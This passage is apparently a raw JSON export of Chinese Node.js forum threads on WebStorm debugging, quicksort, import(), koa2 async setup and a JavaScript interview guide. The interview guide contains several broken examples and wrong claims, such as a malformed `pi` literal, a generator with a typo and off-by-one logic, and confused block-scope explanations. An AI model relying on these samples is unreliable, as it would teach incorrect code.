src=\"https://user-gold-cdn.xitu.io/2019/2/28/169333b6b8dc5497?w=468&amp;h=228&amp;f=png&amp;s=20833\" alt></p>\n<h2>断点调试</h2>\n<p>我们在开发中，无论是大型程序还是小程序，都需要断点调试。在以前IE时代调试JavaScript都是用alert弹窗，那么在Webstrom中我们调试Node.js程序怎么调试呢？</p>\n<p>在代码行数右边单击鼠标左键，就可以添加一个断点。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169333bd62683455?w=554&amp;h=306&amp;f=png&amp;s=71842\" alt></p>\n<p>添加完断点就需要程序开始执行，值得注意的是，如果你是常规执行这段JS程序，点击鼠标右键使用run即可。但是如果你想要调试代码，必须单机鼠标右键使用Debuge。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169333c133f53eea?w=525&amp;h=521&amp;f=png&amp;s=100409\" alt></p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169333c374306172?w=554&amp;h=344&amp;f=png&amp;s=107206\" alt></p>\n</div>","title":"Node.js知识梳理之Node.js的两种运行模式与IDE选择","last_reply_at":"2019-03-02T03:27:19.116Z","good":false,"top":false,"reply_count":1,"visit_count":644,"create_at":"2019-02-28T09:01:31.934Z","author":{"loginname":"zhaodongming","avatar_url":"https://avatars0.githubusercontent.com/u/29243732?v=4&s=120"}},{"id":"5c77a77f04a28b40c4f6a9fb","author_id":"5629da22e6a3804c58159198","tab":"ask","content":"<div class=\"markdown-text\"><pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F;快速排序优化=&gt;基于冒泡+二分查找\nconst quickSort = (arr) =&gt; {\n    if (arr.length &lt;= 1) {\n        return arr;\n    }\n    let mid = Math.floor(arr.length &#x2F; 2);\n    let midNum = arr.splice(mid, 1)[0];\n    &#x2F;&#x2F; let midNum=arr[mid];&#x2F;&#x2F;这里为什么要用splice?如果用下面这种,会循环递归,死循环报错,用上面的方式就会执行结束\n    console.log(mid);\n    let left = [];\n    let right = [];\n    for (let i = 0; i &lt; arr.length; i++) {\n        if (arr[i] &lt; midNum) {\n            left.push(arr[i]);\n        } else {\n            right.push(arr[i]);\n        }\n    }\n    &#x2F;&#x2F; console.log(left,right)\n    return quickSort(left).concat(midNum, quickSort(right))\n\n};\nlet arr = [5, 7, 2, 9, 3, 8, 4, 17, 1, 11];\n\nconsole.log(quickSort(arr));\n</code></pre><p>代码在上面,如果使用注释的那种方式获取中间值,则会死循环,值一直是1,但是用splice就会自动终止.\n这是为什么?</p>\n</div>","title":"关于快速排序算法的一个问题","last_reply_at":"2019-03-02T03:26:27.223Z","good":false,"top":false,"reply_count":4,"visit_count":615,"create_at":"2019-02-28T09:18:55.122Z","author":{"loginname":"qxl1231","avatar_url":"https://avatars1.githubusercontent.com/u/8305742?v=4&s=120"}},{"id":"5c74d521ab86b86ddf6b2e79","author_id":"532dbbb095db4c2478006daa","tab":"ask","content":"<div class=\"markdown-text\"><p>刚开始看貌似是弥补不能运行时加载、按需加载， 用来实现require()的功能的。</p>\n<p>但是为什么要设计成异步、返回Promise，这样没法平滑的替代require()，整个编码结构受到了很大的冲击。</p>\n</div>","title":"【讨论】为什么 import() 函数要设计成异步？并返回一个Promise","last_reply_at":"2019-03-02T01:41:18.681Z","good":false,"top":false,"reply_count":9,"visit_count":1066,"create_at":"2019-02-26T05:56:49.740Z","author":{"loginname":"captainblue2013","avatar_url":"https://avatars1.githubusercontent.com/u/3942299?v=4&s=120"}},{"id":"5a03d817275684445195a973","author_id":"57bb18956b04813133ba909b","tab":"share","content":"<div class=\"markdown-text\"><h3>前言</h3>\n<p>自己使用<code>koa-generator</code>生成一个<code>koa</code>项目后，却发现<code>js</code>的语法都是很老的<code>nodejs</code>，还在用var来定义变量，导入包也是用的<code>require</code>。作为一名<code>nodejs</code>忠实粉丝，怎么也得高大上一点嘛！下面就介绍怎么让<code>koa2</code>项目支持ES7的<code>import</code>和<code>aysnc</code>，<code>await</code>语法。</p>\n<h3>安装runkoa</h3>\n<p>这个是<code>runkoa</code>的<a href=\"https://www.npmjs.com/package/runkoa\">官方介绍</a>，作者确实是个好人，替<code>koa</code>的开发者省去了配置<code>babel</code>的步骤。使用方法如下：\n在控制台输入：</p>\n<pre class=\"prettyprint\"><code>cnpm install -g runkoa\n</code></pre><p>在<code>bin/</code>目录下面新建一个名为<code>run</code>的文件，并复制一下代码：</p>\n<pre class=\"prettyprint\"><code>#!&#x2F;usr&#x2F;bin&#x2F;env node\n\nvar current_path = process.cwd();\nrequire(&#x27;runkoa&#x27;)(current_path + &#x27;&#x2F;bin&#x2F;www&#x27;)\n\n</code></pre><p>修改<code>package.json</code>的<code>scripts</code>命令，将<code>www</code>修改成为<code>run</code>：</p>\n<pre class=\"prettyprint\"><code>&quot;scripts&quot;: {\n    &quot;start&quot;: &quot;node bin&#x2F;run&quot;,\n    &quot;dev&quot;: &quot;.&#x2F;node_modules&#x2F;.bin&#x2F;nodemon bin&#x2F;run&quot;,\n    &quot;prd&quot;: &quot;pm2 start bin&#x2F;run&quot;,\n    &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;\n},\n</code></pre><p>如此，再输入<code>npm run dev</code>, 就可以将<code>require</code>变成<code>import</code>，并且支持<code>async</code>和<code>await</code>。</p>\n<h3>遇到的坑</h3>\n<p>在使用<code>mongoose</code>的时候，我将操作数据库的代码都放在了<code>schema</code>的<code>statics</code>属性中。写代码的时候请注意<code>async</code>和<code>await</code>是要一起出现的，也就是使用了<code>await</code>的方法必须前面有<code>async</code>的关键字。这个我查了好久，家里的网差，很心累。后来使用<code>koa</code>新建了一个测试项目，将两个项目对比，才发现在定义<code>statics</code>的方法的时候没有使用async关键字，但是在调用的时候却使用了<code>await</code>，于是控制台一直报<code>await is a reserved word</code></p>\n<pre class=\"prettyprint\"><code># 定义\nuserSchema.statics.checkname = async function(ctx, name) {\n    let document = await this.findOne({ username: name })\n    if (document) {\n        return { ok: false, msg: &#x27;用户名已经存在&#x27; }\n    } else {\n        return { ok: true, msg: &#x27;用户名合法&#x27; }\n    }\n}\n\n# 调用\nctx.body = await User.checkname(ctx, name)\n\n</code></pre><p>详情可以查看我的博客：<a href=\"http://www.andylistudio.com/2017/10/30/koa2_await_suport/\">http://www.andylistudio.com/2017/10/30/koa2_await_suport/</a></p>\n</div>","title":"如何让koa2项目支持ES7的import和aysnc，await语法","last_reply_at":"2019-03-01T16:01:30.242Z","good":false,"top":false,"reply_count":14,"visit_count":5436,"create_at":"2017-11-09T04:22:47.434Z","author":{"loginname":"Andyliwr","avatar_url":"https://avatars1.githubusercontent.com/u/12456160?v=4&s=120"}},{"id":"5c79276e0d249a149624f4d9","author_id":"554ab49c852845e37ac8b24a","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FtezKJDKEclQh9sY1yRUgsafHsh8\" alt=\"image.png\"></p>\n<p>跑一段单元测试, 会偶发异常, 40%的概率左右, 请问这个是什么原因呢</p>\n</div>","title":"使用egg单元测试的疑惑","last_reply_at":"2019-03-01T14:14:24.690Z","good":false,"top":false,"reply_count":1,"visit_count":537,"create_at":"2019-03-01T12:37:02.230Z","author":{"loginname":"yinhaixiang","avatar_url":"https://avatars.githubusercontent.com/u/10047441?v=3&s=120"}},{"id":"5c6e1d28e1a81129a7ad91a6","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><strong>摘要：</strong> 面试季手册。</p>\n<ul>\n<li>原文：<a href=\"https://segmentfault.com/a/1190000018227761\">javascript 面试的完美指南(开发者视角)</a></li>\n<li>作者：<a href=\"https://segmentfault.com/a/1190000017794020\">前端小智</a></li>\n</ul>\n<p><strong><a href=\"https://www.fundebug.com/\">Fundebug</a>经授权转载，版权归原作者所有。</strong></p>\n<p>为了说明 JS 面试的复杂性，首先，请尝试给出以下结果：</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(2.0 == “2” == new Boolean(true) == “1”)\n</code></pre><p>十有八九的会给出false， 其实运行结果是true，原因请看 <a href=\"https://youtu.be/P8ltWIqDPzo\">这里</a>。</p>\n<h3>1) 理解 JS 函数</h3>\n<p>函数是 JavaScript 的精华，是 JS 一等公民。JS 函数不仅仅是一个普通的函数，与其他语言不同，JS 函数可以赋值给变量，作为参数传递给另一个函数，也可以从另一个函数返回。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(square(5));\n&#x2F;* ... *&#x2F;\nfunction square(n) { return n * n; }\n</code></pre><p>以为代码很简单，大家应该都知道会打印：<code>25</code>。接着看一个：</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(square(5));\n \nvar square = function(n) { \n  return n * n; \n}\n</code></pre><p>乍一看，你可能会忍不住说也打印了 <code>25</code>。但很不幸，会报错：</p>\n<pre class=\"prettyprint language-javascript\"><code>TypeError: square is not a function\n</code></pre><p>在 JavaScript 中，如果将函数定义为变量，变量名将被提升，是 JS 执行到它的<strong>定义</strong>才能被访问。</p>\n<p>你可能在一些代码中频繁的见到如下代码。</p>\n<pre class=\"prettyprint language-javascript\"><code>var simpleLibrary = function() {\n   var simpleLibrary = {\n        a,\n        b,\n        add: function(a, b) {\n            return a + b;\n        },\n        subtract: function(a, b) {\n            return a - b;   \n        }\n   }\n  return simpleLibrary;\n}();\n</code></pre><p>为什么会做这种奇怪的事情？ 这是因为一个函数变量中变量和函数被分装，可以避免全局变量污染。 <strong>JQuery</strong> 到<strong>Lodash</strong> 的库采用这种技术提供 <code>$</code>、<code>_</code> 等</p>\n<h3>2) 理解 bind、apply 和 call</h3>\n<p>你可能在所有常用库中看到过这三个函数。它们允许局部套用， 我们可以把功能组合到不同的函数。一个优秀的js开发者可以随时告诉你关于这三个函数。</p>\n<p>基本上，这些是改变行为以实现某些功能的原型方法，根据 JS 开发人员 Chad 的说法，用法如下：</p>\n<p>希望使用某个上下文调用该函数，请使用 <code>.bind()</code> ，这在事件中很有用。 如果要立即调用函数，请使用<code>.call()</code> 或 <code>.apply()</code>，并修改上下文。</p>\n<h4><strong>举例说明</strong></h4>\n<p>让我们看看上面的陈述是什么意思! 假设你的数学老师要求你创建一个库并提交。你写了一个抽象的库，它可以求出圆的面积和周长：</p>\n<pre class=\"prettyprint language-javascript\"><code>var mathLib = {\n    pi: 3.14,\n    area: function(r) {\n        return this.pi * r * r;\n    },\n    circumference: function(r) {\n        return 2 * this.pi * r;\n    }\n};\n</code></pre><p>提交后，老师调用了它：</p>\n<pre class=\"prettyprint language-javacript\"><code>mathLib.area(2);\n12.56\n</code></pre><p>老师发现他给你要求是 <code>pi</code> 精确到小数点后 <code>5</code> 位数而你只精确到 <code>2</code> 位， 现在由于最后期限已过你没有机会提交库。 这里 JS的 <code>call</code> 函数可以帮你， 只需要调用你的代码如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>mathLib.area.call({pi: 3.1.159}, 2)\n</code></pre><p>它会动态地获取新的 <code>pi</code> 值,结果如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>12.56636\n</code></pre><p>这时，注意到 <code>call</code> 函数具有两个参数：</p>\n<ul>\n<li>Context</li>\n<li>函数参数</li>\n</ul>\n<p>在 <code>area</code> 函数中， 上下文是对象被关键词 <code>this</code> 代替，后面的参数作为函数参数被传递。 如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>var cylinder = {\n    pi: 3.14,\n    volume: function(r, h) {\n        return this.pi * r * r * h;\n    }\n};\n\n</code></pre><p>调用方式如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>cylinder.volume.call({pi: 3.14159}, 2, 6);\n75.39815999999999\n</code></pre><p><strong>Apply</strong> 类似，只是函数参数作为数组传递。</p>\n<pre class=\"prettyprint language-javascript\"><code>cylinder.volume.apply({pi: 3.14159}, [2, 6]);\n75.39815999999999\n</code></pre><p>如果你会使用 <strong>call</strong> 你基本就会用 <strong>apply</strong> 了，反之亦然， 那 <strong>bind</strong> 的用法又是如何呢 ？</p>\n<p><strong>bind</strong> 将一个全新的 <strong>this</strong> 注入到指定的函数上，改变 <strong>this</strong> 的指向， 使用 <strong>bind</strong> 时，函数不会像 <code>call</code> 或 <code>apply</code> 立即执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>var newVolume = cylinder.volume.bind({pi: 3.14159});\nnewVolume(2,6); &#x2F;&#x2F; Now pi is 3.14159\n</code></pre><p><strong>bind</strong> 用途是什么?它允许我们将上下文注入一个函数，该函数返回一个具有更新上下文的新函数。这意味着这个变量将是用户提供的变量，这在处理 JavaScript 事件时非常有用。</p>\n<h3>3) 理解 js 作用域(闭包)</h3>\n<p>JavaScript 的作用域是一个潘多拉盒子。从这一个简单的概念中，就可以构造出数百个难回答的面试问题。有三种作用域：</p>\n<ul>\n<li>全局作用域</li>\n<li>本地/函数作用域</li>\n<li>块级作用域(ES6引进)</li>\n</ul>\n<p>全局作用域事例如下:</p>\n<pre class=\"prettyprint language-javascript\"><code>x = 10;\nfunction Foo() {\n  console.log(x); &#x2F;&#x2F; Prints 10\n}\nFoo()\n</code></pre><p>函数作用域生效当你定义一个局部变量时：</p>\n<pre class=\"prettyprint language-javascript\"><code>pi = 3.14;\nfunction circumference(radius) {    \n     pi = 3.14159;\n     console.log(2 * pi * radius); &#x2F;&#x2F; 打印 &quot;12.56636&quot; 不是 &quot;12.56&quot;\n}\ncircumference(2);\n</code></pre><p>ES16 标准引入了新的块作用域，它将变量的作用域限制为给定的括号块。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 10;\n\nfunction Foo() {\n  if (true) {\n    let a = 4;\n  }\n\n  alert(a); &#x2F;&#x2F; alerts &#x27;10&#x27; because the &#x27;let&#x27; keyword\n}\nFoo();\n</code></pre><p>函数和条件都被视为块。以上例子应该弹出 <code>4</code>，因为 <code>if</code> 已执行。但 是ES6 销毁了块级变量的作用域，作用域进入全局。</p>\n<p>现在来到神奇的作用域，可以使用闭包来实现，JavaScript 闭包是一个返回另一个函数的函数。</p>\n<p>如果有人问你这个问题，编写一个输入一个字符串并逐次返回字符。 如果给出了新字符串，则应该替换旧字符串，类似简单的一个生成器。</p>\n<pre class=\"prettyprint language-javascript\"><code>function generator(input) {\n  var index = 0;\n  return {\n    next: function() {\n      if (index &lt; input.lenght) {\n        return input[index -1];\n      }\n      return &quot;&quot;;\n    }\n  }\n}\n</code></pre><p>执行如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>var mygenerator = generator(&quot;boomerang&quot;);\nmygenerator.next(); &#x2F;&#x2F; returns &quot;b&quot;\nmygenerator.next() &#x2F;&#x2F; returns &quot;o&quot;\nmygenerator = generator(&quot;toon&quot;);\nmygenerator.next(); &#x2F;&#x2F; returns &quot;t&quot;\n</code></pre><p>在这里，作用域扮演着重要的角色。闭包是返回另一个函数并携带数据的函数。上面的字符串生成器适用于闭包。<strong>index</strong> 在多个函数调用之间保留,定义的内部函数可以访问在父函数中定义的变量。这是一个不同的作用域。如果在第二级函数中再定义一个函数，它可以访问所有父级变量。</p>\n<h3>4) this (全局域、函数域、对象域)</h3>\n<p>在 JavaScript 中，我们总是用函数和对象编写代码， 如果使用浏览器，则在全局上下文中它引用 <strong>window</strong> 对象。 我的意思是，如果你现在打开浏览器控制台并输入以下代码，输出结果为 <strong>true</strong>。</p>\n<pre class=\"prettyprint language-javascript\"><code>this === window;\n</code></pre><p>当程序的上下文和作用域发生变化时，<strong>this</strong> 也会发生相应的变化。现在观察 <strong>this</strong> 在一个局部上下文中：</p>\n<pre class=\"prettyprint language-javascript\"><code>function Foo(){\n  console.log(this.a);\n}\nvar food = {a: &quot;Magical this&quot;};\nFoo.call(food); &#x2F;&#x2F; food is this\n</code></pre><p>思考一下，以下输出的是什么：</p>\n<pre class=\"prettyprint language-javascript\"><code>function Foo(){\n    console.log(this); &#x2F;&#x2F; 打印 {}?\n}\n</code></pre><p>因为这是一个全局对象，记住，无论父作用域是什么，它都将由子作用域继承。打印出来是 window 对象。上面讨论的三个方法实际上用于设置这个对象。</p>\n<p>现在，<strong>this</strong> 的最后一个类型，在对象中的 <strong>this</strong>, 如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>var person = {\n    name: &quot;Stranger&quot;,\n    age: 24,\n    get identity() {\n        return {who: this.name, howOld: this.age};\n    }\n}\n</code></pre><p>上述使用了 getter 语法，这是一个可以作为变量调用的函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>person.identity; &#x2F;&#x2F; returns {who: &quot;Stranger&quot;, howOld: 24}\n</code></pre><p>此时，<strong>this</strong> 实际上是指对象本身。正如我们前面提到的，它在不同的地方有不同的表现。</p>\n<h3>5) 理解对象 (Object.freeze, Object.seal)</h3>\n<p>通常对象的格式如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>var marks = {physics: 98, maths:95, chemistry: 91};\n</code></pre><p>它是一个存储键、值对的映射。 javascript 对象有一个特殊的属性，可以将任何东西存储为一个值。这意味着我们可以将一个列表、另一个对象、一个函数等存储为一个值。</p>\n<p>可以用如下方式来创建对象：</p>\n<pre class=\"prettyprint language-javascript\"><code>var marks = {};\nvar marks = new Object();\n</code></pre><p>可以使用 <strong>JSON.stringify()</strong> 将一个对象转制成字符串，也可以用 <strong>JSON.parse</strong> 在将其转成对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; returns &quot;{&quot;physics&quot;:98,&quot;maths&quot;:95,&quot;chemistry&quot;:91}&quot;\nJSON.stringify(marks);\n&#x2F;&#x2F; Get object from string\nJSON.parse(&#x27;{&quot;physics&quot;:98,&quot;maths&quot;:95,&quot;chemistry&quot;:91}&#x27;);\n</code></pre><p>使用 <strong>Object.keys</strong> 迭代对象：</p>\n<pre class=\"prettyprint language-javascript\"><code>var highScere = 0;\n\nfor (i of Object.keys(marks)) {\n  if (marks[i] &gt; highScore)\n    highScore = marks[i];\n}\n</code></pre><p><strong>Object.values</strong> 以数组的方式返回对象的值。</p>\n<p>对象上的其他重要函数有:</p>\n<ul>\n<li>Object.prototype(object)</li>\n<li>Object.freeze(function)</li>\n<li>Object.seal(function)</li>\n</ul>\n<p><strong>Object.prototype</strong> 上提供了许多应用上相关的函数，如下：</p>\n<p><strong>Object.prototype.hasOwnProperty</strong> 用于检查给定的属性/键是否存在于对象中。</p>\n<pre class=\"prettyprint language-javascript\"><code>marks.hasOwnProperty(&quot;physics&quot;); &#x2F;&#x2F; returns true\nmarks.hasOwnProperty(&quot;greek&quot;); &#x2F;&#x2F; returns false\n</code></pre><p><strong>Object.prototype.instanceof</strong> 判断给定对象是否是特定原型的类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>function Car(make, model, year) {\n  this.make = make;\n  this.model = model;\n  this.year = year;\n}\nvar newCar = new Car(&#x27;Honda&#x27;, &#x27;City&#x27;, 2007);\nconsole.log(newCar instanceof Car); &#x2F;&#x2F; returns true\n</code></pre><p>使用 <strong>Object.freeze</strong> 可以冻结对象，以便不能修改对象现有属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var marks = {physics: 98, maths:95, chemistry: 91};\nfinalizedMarks = Object.freeze(marks);\nfinalizedMarks[&quot;physics&quot;] = 86; &#x2F;&#x2F; throws error in strict mode\nconsole.log(marks); &#x2F;&#x2F; {physics: 98, maths: 95, chemistry: 91}\n</code></pre><p>在这里，试图修改冻结后的 <code>physics</code> 的值，但 JavaScript不允许这样做。我们可以使用 <strong>Object.isFrozen</strong> 来判断，给定对象是否被冻结:</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.isFrozen(finalizedMarks); &#x2F;&#x2F; returns true\n</code></pre><p><strong>Object.seal</strong> 与 <strong>Object.freeze</strong> 略有不同。 <strong>Object.seal()</strong> 方法封闭一个对象，阻止添加新属性并将所有现有属性标记为不可配置。当前属性的值只要可写就可以改变。</p>\n<pre class=\"prettyprint language-javascript\"><code>var marks = {physics: 98, maths:95, chemistry: 91};\nObject.seal(marks);\ndelete marks.chemistry; &#x2F;&#x2F; returns false as operation failed\nmarks.physics = 95; &#x2F;&#x2F; Works!\nmarks.greek = 86; &#x2F;&#x2F; Will not add a new property\n</code></pre><p>同样， 可以使用 <strong>Object.isSealed</strong> 判断对象是否被密封。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.isSealed(marks); &#x2F;&#x2F; returns true\n</code></pre><p>在全局对象函数上还有许多其他重要的函数/方法，在<a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object\">这里</a>找到他们。</p>\n<p><strong>代码部署后可能存在的BUG没法实时知道，事后为了解决这些BUG，花了大量的时间进行log 调试，这边顺便给大家推荐一个好用的BUG监控工具 <a href=\"https://www.fundebug.com/?utm_source=xiaozhi\">Fundebug</a>。</strong></p>\n<h3>6) 理解原型继承</h3>\n<p>在传统 JavaScript 中，有一种伪装的继承概念，它是通过使用原型技术来实现的。在ES5、ES6中看到使用 <strong>new</strong> 的语法只是底层原型OOP的语法糖。创建类是使用 JavaScript 中的函数完成的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var animalGroups = {\n  MAMMAL: 1,\n  REPTILE: 2,\n  AMPHIBIAN: 3,\n  INVERTEBRATE: 4\n};\nfunction Animal(name, type) {\n  this.name = name;\n  this.type = type;\n}\nvar dog = new Animal(&quot;dog&quot;, animalGroups.MAMMAL);\nvar crocodile = new Animal(&quot;crocodile&quot;, animalGroups.REPTILE);\n</code></pre><p>这里我们为类创建对象(使用 <strong>new</strong> 关键字)，可以使用如下方式对类追加方法：</p>\n<pre class=\"prettyprint language-javascript\"><code>Animal.prototype.shout = function() {\n  console.log(this.name+&#x27;is&#x27;+this.sound+&#x27;ing...&#x27;);\n}\n</code></pre><p>这里你可能会有疑问。类中并没 <strong>sound</strong> 属性。是的，它打算由继承了上述类的子类传递。</p>\n<p>JavaScript中， 如下实现继承：</p>\n<pre class=\"prettyprint language-javascript\"><code>function Dog(name, type) {\nAnimal.call(this, name, type);\nthis.sound = &#x27;bow&#x27;;\n}\n</code></pre><p>我定义了一个更具体的函数，叫做 <strong>Dog</strong>。在这里，为了继承 <strong>Animal</strong> 类，我需要call传递this和其他参数。使用如下方式来实例化一只<code>德国牧羊犬</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var pet = Dog(&quot;德国牧羊犬&quot;, animalGroups.MAMMAL);\nconsole.log(pet); &#x2F;&#x2F; returns Dog {name: &quot;德国牧羊犬&quot;, type: 1, sound: &quot;bow&quot;}\n</code></pre><p>我们没有在子函数中分配 <code>name</code> 和 <code>type</code> 属性，我们调用的是超级函数 Animal 并设置相应的属性。<strong>pet</strong> 具有父类的属性(name、type)。但是方法呢。他们也继承的吗? 来看看：</p>\n<pre class=\"prettyprint language-javascript\"><code>pet.shout(); &#x2F;&#x2F; Throws error\n</code></pre><p>为什么会这样？ 之所以发生这种情况，是因为没有指定让 JavaScript来继承父类方法。 如何解决？</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; Link prototype chains\nDog.prototype = Object.create(Animal.prototype);\nvar pet = new Dog(&quot;germanShepard&quot;, animalGroups.MAMMAL);\n&#x2F;&#x2F; Now shout method is available\npet.shout(); &#x2F;&#x2F; 德国牧羊犬 bowing...\n</code></pre><p>现在可以使用 <code>shout</code> 方法。 我们可以使用 <strong>object.constructor</strong> 函数检查 JavaScript 中给定对象的类 来看看 <strong>pet</strong> 是什么类:</p>\n<pre class=\"prettyprint language-javascript\"><code>pet.constructor; &#x2F;&#x2F; returns Animal\n</code></pre><p>这是模糊的,<strong>Animal</strong> 是一个父类。但是 <strong>pet</strong> 到底是什么类型的呢? <strong>pet</strong> 应该是 <code>Dog</code> 的类型。之所以是 <strong>Animal</strong> 类型，是因为 <strong>Dog</strong> 类的构造函数：</p>\n<pre class=\"prettyprint language-javascript\"><code>Dog.prototype.constructor; &#x2F;&#x2F; returns Animal\n</code></pre><p>它是 <strong>Animal</strong> 类型的。我们应该将它设置为 <strong>Dog</strong> 本身，这样类的所有实例(对象)才能给出正确的类名。</p>\n<pre class=\"prettyprint language-javascript\"><code>Dog.prototype.constructor = Dog;\n</code></pre><p>关于原型继承， 我们应该记住以下几条：</p>\n<ul>\n<li>类属性使用 <code>this</code> 绑定</li>\n<li>类方法使用 <code>prototype</code> 对象来绑定</li>\n<li>为了继承属性， 使用 <code>call</code> 函数来传递 <code>this</code></li>\n<li>为了继承方法, 使用 <strong>Object.create</strong> 连接父和子的原型</li>\n<li>始终将子类构造函数设置为自身，以获得其对象的正确类型</li>\n</ul>\n<h2>7）理解 callback 和 promise</h2>\n<p>回调是在 I/O 操作完成后执行的函数。一个耗时的I/O操作会阻塞代码， 因此在Python/Ruby不被允许。但是在 JavaScript中，由于允许异步执行，我们可以提供对异步函数的回调。这个例子是由浏览器到服务器的AJAX(XMLHettpRequest)调用，由鼠标、键盘事件生成。如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>function reqListener () {\n  console.log(this.responseText);\n}\n\nvar req = new XMLHttpRequest();\nreq.addEventListener(&quot;load&quot;, reqListener);\nreq.open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;www.example.org&#x2F;example.txt&quot;);\nreq.send();\n</code></pre><p>这里的 <strong>reqListener</strong> 是一个回调函数，当成功响应 <strong>GET</strong> 请求时将执行该回调函数。</p>\n<p>Promise 是回调函数的优雅的封装， 使得我们优雅的实现异步代码。在以下给出的这篇文章中讨论了很多 <strong>promise</strong>,这也是在 JS 中应该知道的重要部分。</p>\n<p><a href=\"https://medium.com/dev-bits/writing-neat-asynchronous-node-js-code-with-promises-32ed3a4fd098\">Writing neat asynchronous Node JS code with Promises</a></p>\n<h2>8）理解正则表达</h2>\n<p>正则表达式有许多应用地方，处理文本、对用户输入执行规则等。JavaScript 开发人员应该知道如何执行基本正则表达式并解决问题。<strong>Regex</strong> 是一个通用概念，来看看如何从 JS 中做到这一点。</p>\n<p>创建正则表达式，有如下两种方式：</p>\n<pre class=\"prettyprint language-javascript\"><code>var re = &#x2F;ar&#x2F;;\nvar re = new RegExp(&#x27;ar&#x27;); \n</code></pre><p>上面的正则表达式是与给定字符串集匹配的表达式。定义正则表达式之后，我们可以尝试匹配并查看匹配的字符串。可以使用 <strong>exec</strong> 函数匹配字符串:</p>\n<pre class=\"prettyprint language-javascript\"><code>re.exec(&quot;car&quot;); &#x2F;&#x2F; returns [&quot;ar&quot;, index: 1, input: &quot;car&quot;]\nre.exec(&quot;cab&quot;); &#x2F;&#x2F; returns null\n</code></pre><p>有一些特殊的字符类允许我们编写复杂的正则表达式。<strong>RegEx</strong> 中有许多类型的元素，其中一些如下:</p>\n<ul>\n<li>字符正则：<code>\\w</code>-字母数字， <code>\\d</code>- 数字， <code>\\D</code>- 没有数字</li>\n<li>字符类正则：[<code>x-y]</code> x-y区间， <code>[^x]</code> 没有x</li>\n<li>数量正则：<code>+</code> 至少一个、<code>?</code> 没或多个、<code>*</code> 多个</li>\n<li>边界正则，<code>^</code> 开始、<code>$</code> 结尾</li>\n</ul>\n<p>例子如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;* Character class *&#x2F;\n\nvar re1 = &#x2F;[AEIOU]&#x2F;;\nre1.exec(&quot;Oval&quot;); &#x2F;&#x2F; returns [&quot;O&quot;, index: 0, input: &quot;Oval&quot;]\nre1.exec(&quot;2456&quot;); &#x2F;&#x2F; null\nvar re2 = &#x2F;[1-9]&#x2F;;\nre2.exec(&#x27;mp4&#x27;); &#x2F;&#x2F; returns [&quot;4&quot;, index: 2, input: &quot;mp4&quot;]\n\n&#x2F;* Characters *&#x2F;\n\nvar re4 = &#x2F;\\d\\D\\w&#x2F;;\nre4.exec(&#x27;1232W2sdf&#x27;); &#x2F;&#x2F; returns [&quot;2W2&quot;, index: 3, input: &quot;1232W2sdf&quot;]\nre4.exec(&#x27;W3q&#x27;); &#x2F;&#x2F; returns null\n\n&#x2F;* Boundaries *&#x2F;\n\nvar re5 = &#x2F;^\\d\\D\\w&#x2F;;\nre5.exec(&#x27;2W34&#x27;); &#x2F;&#x2F; returns [&quot;2W3&quot;, index: 0, input: &quot;2W34&quot;]\nre5.exec(&#x27;W34567&#x27;); &#x2F;&#x2F; returns null\nvar re6 = &#x2F;^[0-9]{5}-[0-9]{5}-[0-9]{5}$&#x2F;;\nre6.exec(&#x27;23451-45242-99078&#x27;); &#x2F;&#x2F; returns [&quot;23451-45242-99078&quot;, index: 0, input: &quot;23451-45242-99078&quot;]\nre6.exec(&#x27;23451-abcd-efgh-ijkl&#x27;); &#x2F;&#x2F; returns null\n\n&#x2F;* Quantifiers *&#x2F;\n\nvar re7 = &#x2F;\\d+\\D+$&#x2F;;\nre7.exec(&#x27;2abcd&#x27;); &#x2F;&#x2F; returns [&quot;2abcd&quot;, index: 0, input: &quot;2abcd&quot;]\nre7.exec(&#x27;23&#x27;); &#x2F;&#x2F; returns null\nre7.exec(&#x27;2abcd3&#x27;); &#x2F;&#x2F; returns null\nvar re8 = &#x2F;&lt;([\\w]+).*&gt;(.*?)&lt;\\&#x2F;\\1&gt;&#x2F;;\nre8.exec(&#x27;&lt;p&gt;Hello JS developer&lt;&#x2F;p&gt;&#x27;); &#x2F;&#x2F;returns  [&quot;&lt;p&gt;Hello JS developer&lt;&#x2F;p&gt;&quot;, &quot;p&quot;, &quot;Hello JS developer&quot;, index: 0, input: &quot;&lt;p&gt;Hello JS developer&lt;&#x2F;p&gt;&quot;]\n</code></pre><p>有关 regex 的详细信息，可以看 <a href=\"http://www.rexegg.com/regex-quickstart.html\">这里</a>。</p>\n<p>除了 <strong>exec</strong> 之外，还有其他函数，即 <strong>match</strong>、<strong>search</strong> 和 <strong>replace</strong>，可以使用正则表达式在另一个字符串中查找字符串，但是这些函数在字符串本身上使用。</p>\n<pre 